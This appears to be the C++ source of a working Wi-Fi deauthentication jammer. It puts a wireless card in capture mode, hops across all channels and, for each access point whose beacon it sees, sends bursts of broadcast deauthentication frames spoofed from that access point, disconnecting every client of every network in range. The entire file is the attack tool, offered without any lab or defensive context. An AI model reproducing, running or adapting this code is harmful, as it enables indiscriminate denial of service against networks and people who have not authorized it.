#include "wifi-jammer.hpp"

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

BOOL BeaconFrame::IsBeacon()
{
    if (Subtype == 8 && Type == 0)
        return true;
    return false;
}

Channel *WirelessManagement::GetChannel()
{
    TaggedParameter *Tag = (TaggedParameter *)TaggedData;
    while (Tag->TagNumber != 0x03)
    {
        Tag = (TaggedParameter *)((ULONG_PTR)Tag + 2 + Tag->TagLength);
    }
    
    return (Channel *)Tag;
}

SSID *WirelessManagement::GetSSID()
{
    TaggedParameter *Tag = (TaggedParameter *)TaggedData;
    while (Tag->TagNumber != 0x00)
    {
        Tag = (TaggedParameter *)((ULONG_PTR)Tag + 2 + Tag->TagLength);
    }
    
    return (SSID *)Tag;
}

Jammer::Jammer(char *dev)
{
    char errbuf[PCAP_BUF_SIZE];
    this->skfd = iw_sockets_open();
    this->dev = dev;
    this->pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        exit(-1);
    }
    if (iw_get_range_info(skfd, dev, &this->range) < 0)
    {
        fprintf(stderr, "%-8.16s   no frequency information.\n\n", dev);
        exit(-1);
    }
}

char *Jammer::getifname()
{
    return this->dev;
}

pcap_t *Jammer::getpcap()
{
    return this->pcap;
}

int Jammer::getskfd()
{
    return this->skfd;
}

struct iw_range *Jammer::getiw_range()
{
    return &this->range;
}

bool setChannel(int skfd, char *dev, double channel)
{
    struct iwreq wrq = { 0, };
    wrq.u.freq.flags = IW_FREQ_FIXED;
    iw_float2freq(channel, &(wrq.u.freq));
    return iw_set_ext(skfd, dev, SIOCSIWFREQ, &wrq) < 0 ? false : true;
}

int getCurChannel(int skfd, char *dev, const struct iw_range *range)
{
    struct iwreq wrq;
    double freq;
    int channel = 0;
    if (iw_get_ext(skfd, dev, SIOCGIWFREQ, &wrq) >= 0)
    {
        freq = iw_freq2float(&(wrq.u.freq));
        channel = iw_freq_to_channel(freq, range);
    }

    return channel;
}

void ChannelHopping(Jammer *jammer)
{
    struct iw_range *range = jammer->getiw_range();
    while (true)
    {
        for (int i = 0; i < range->num_frequency; i++)
        {
            pthread_mutex_lock(&mutex);
            setChannel(jammer->getskfd(), jammer->getifname(), range->freq[i].i);
            // printf("%d\n", range->freq[i].i);
            pthread_mutex_unlock(&mutex);
            usleep(500000);
        }   
    }
}

bool SendDeauthPacket(Jammer *jammer, BYTE *BSSID, int Channel)
{
    BYTE DeauthPacket[] = { 0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xaa, 0x2b, 0xb9, 0x59, 0x77, 0x72, 0xaa, 0x2b, 0xb9, 0x59, 0x77, 0x72, 0x00, 0x00, 0x07, 0x00 };
    memcpy(DeauthPacket + 21, BSSID, 6);
    memcpy(DeauthPacket + 27, BSSID, 6);

    int CurChannel = getCurChannel(jammer->getskfd(), jammer->getifname(), jammer->getiw_range());
    pthread_mutex_lock(&mutex);
    if (Channel != CurChannel)
        setChannel(jammer->getskfd(), jammer->getifname(), Channel);

    bool ret = false;
    pcap_t *pcap = jammer->getpcap();
    for (int i = 0; i < 10; i++)
    {
        ret = pcap_sendpacket(pcap, DeauthPacket, 37) == 0 || ret ? true : false;
        usleep(10000);
    }
    pthread_mutex_unlock(&mutex);
    return ret;
}

int WiFi_Jammer(Jammer *jammer)
{
    pthread_t ThreadId;
    pcap_t *pcap = jammer->getpcap();
    pthread_create(&ThreadId, NULL, (void*(*)(void*))ChannelHopping, jammer);
    pthread_detach(ThreadId);
    while (true)
    {
        struct pcap_pkthdr *header;
        const unsigned char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        IEEE_80211 *IEEE_80211 = (struct _IEEE_80211 *)packet;

        if (IEEE_80211->Beacon.IsBeacon() == false)
            continue;

        SSID *ssid = IEEE_80211->Management.GetSSID();

        printf("Send deauth packet SSID : ");
        for (int i = 0; i < ssid->Tag.TagLength; i++)
        {
            putchar(ssid->SSID[i]);
        }
        putchar('\n');
        
        if (SendDeauthPacket(jammer, IEEE_80211->Beacon.BSSID, IEEE_80211->Management.GetChannel()->Channel) == false)
            break;
    }

    return false;
}